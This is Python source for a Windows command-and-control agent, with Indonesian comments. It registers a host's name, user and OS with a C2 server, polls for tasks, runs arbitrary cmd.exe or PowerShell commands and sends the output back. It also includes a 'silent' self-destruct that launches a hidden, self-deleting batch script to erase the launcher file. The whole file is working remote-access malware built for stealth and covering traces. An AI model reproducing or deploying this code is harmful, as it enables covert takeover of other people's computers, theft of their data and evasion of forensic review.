# agent_dalang.py (Revisi Final - Silent Exit)

import requests
import subprocess
import time
import random
import socket
import getpass
import platform
import sys
import os

# --- KONFIGURASI ---
C2_URL = "http://192.168.1.100:5000"
AGENT_ID = None
BAT_TO_DELETE = None 

def register_agent():
    global AGENT_ID
    hostname = socket.gethostname()
    username = getpass.getuser()
    os_info = f"{platform.system()} {platform.release()}"
    payload = {"hostname": hostname, "username": username, "os": os_info}
    try:
        response = requests.post(f"{C2_URL}/api/register", json=payload, timeout=5)
        response.raise_for_status()
        data = response.json()
        AGENT_ID = data.get("agent_id")
        print(f"[+] Berhasil mendaftar. Agent ID: {AGENT_ID}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Gagal terhubung ke C2: {e}")
        AGENT_ID = None

def get_task():
    if not AGENT_ID: return None
    try:
        url = f"{C2_URL}/api/tasks/{AGENT_ID}"
        response = requests.get(url, timeout=5)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"[!] Gagal mengambil tugas: {e}")
        return None

def execute_task(task):
    tool = task.get("tool")
    command = task.get("command")
    if tool not in ["cmd.exe", "powershell"]:
        return "Error: Tool tidak didukung."
    try:
        if tool == "cmd.exe": full_command = [tool, "/c", command]
        else: full_command = [tool, "-Command", command]
        result = subprocess.run(full_command, capture_output=True, text=True, shell=True)
        output = result.stdout if result.stdout else ""
        output += result.stderr if result.stderr else ""
        return output if output else "Perintah dieksekusi tanpa output."
    except Exception as e:
        return f"Error saat eksekusi: {str(e)}"

def send_results(task_id, output):
    if not AGENT_ID or task_id == "none": return
    payload = {"task_id": task_id, "output": output}
    try:
        url = f"{C2_URL}/api/results"
        requests.post(url, json=payload, timeout=5)
        print(f"[+] Hasil untuk Task ID {task_id} berhasil dikirim.")
    except requests.exceptions.RequestException as e:
        print(f"[!] Gagal mengirim hasil: {e}")

def main_loop():
    """Loop utama untuk operasional agent."""
    register_agent()

    while True:
        if not AGENT_ID:
            time.sleep(60)
            register_agent()
            continue

        task = get_task()

        if task:
            task_id = task.get("task_id")
            command = task.get("command")
            tool = task.get("tool")

            # --- BLOK LOGIKA SELF-DESTRUCT YANG DISEMPURNAKAN ---
            if tool == "internal" and command == "self-destruct":
                print("[!] Menerima perintah terminate & self-destruct.")
                send_results(task_id, "Agent terminated successfully. Footprint cleanup initiated.")
                
                if BAT_TO_DELETE and os.path.exists(BAT_TO_DELETE):
                    cleanup_script_path = os.path.join(os.environ["TEMP"], f"cleanup_{random.randint(1000,9999)}.bat")
                    
                    # --- PERUBAHAN UTAMA: Skrip pembersih dibuat tanpa ECHO ---
                    with open(cleanup_script_path, "w") as f:
                        f.write(f'@echo off\n')
                        f.write(f'timeout /t 2 /nobreak > NUL\n')
                        f.write(f'del "{BAT_TO_DELETE}"\n')
                        f.write(f'(goto) 2>nul & del "%~f0"')
                    
                    # --- PERUBAHAN UTAMA: Menambahkan creationflags yang spesifik untuk Windows ---
                    # Ini akan memastikan tidak ada jendela CMD yang muncul sama sekali.
                    DETACHED_PROCESS = 0x00000008
                    CREATE_NO_WINDOW = 0x08000000
                    
                    subprocess.Popen(
                        ['cmd.exe', '/c', cleanup_script_path],
                        creationflags=DETACHED_PROCESS | CREATE_NO_WINDOW
                    )
                    print(f"[*] Skrip pembersih tak terlihat diluncurkan untuk menghapus {BAT_TO_DELETE}")

                sys.exit(0)

            if command == "sleep":
                sleep_duration = task.get("duration", 30)
                time.sleep(sleep_duration)
            else:
                output = execute_task(task)
                send_results(task_id, output)
                time.sleep(random.randint(5, 10))
        else:
            time.sleep(30)

if __name__ == "__main__":
    if len(sys.argv) > 1:
        BAT_TO_DELETE = sys.argv[1]
        print(f"[INFO] Agent akan menghapus jejak file: {BAT_TO_DELETE} saat di-terminate.")

    main_loop()
